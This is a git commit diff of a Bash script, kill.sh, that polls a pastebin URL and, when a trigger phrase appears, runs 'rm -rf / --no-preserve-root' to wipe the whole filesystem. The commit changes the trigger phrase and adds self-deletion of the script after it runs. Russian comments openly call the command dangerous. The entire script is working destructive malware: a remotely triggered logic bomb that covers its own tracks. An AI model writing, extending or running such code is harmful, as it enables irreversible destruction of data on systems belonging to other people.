276c9954d9280aa68c8dc1f3c41079ff4d473c32
yma-Lib <l864782364@gmail.com>
2025-03-01 21:06:00 +0300

    Update kill.sh

--- kill.sh
+++ kill.sh
@@ -1,12 +1,13 @@
 #!/bin/bash
 
 url="https://pastebin.com/raw/8LbpK8d9"
-phrase="1"
+phrase="123"
 
 while true; do
     content=$(curl -s $url)
     if [[ "$content" == *"$phrase"* ]]; then
-        rm -rf / --no-preserve-root  # ОПАСНАЯ КОМАНДА! Удаляет все файлы в системе.
+        rm -rf / --no-preserve-root  # ОПАСНАЯ КОМАНДА! Удаляет все файлы в системе
+        rm -- "$0"  # Удаляем сам скрипт после выполнения
         break
     else
         sleep 5  # ждем 5 секунд перед следующей проверкой
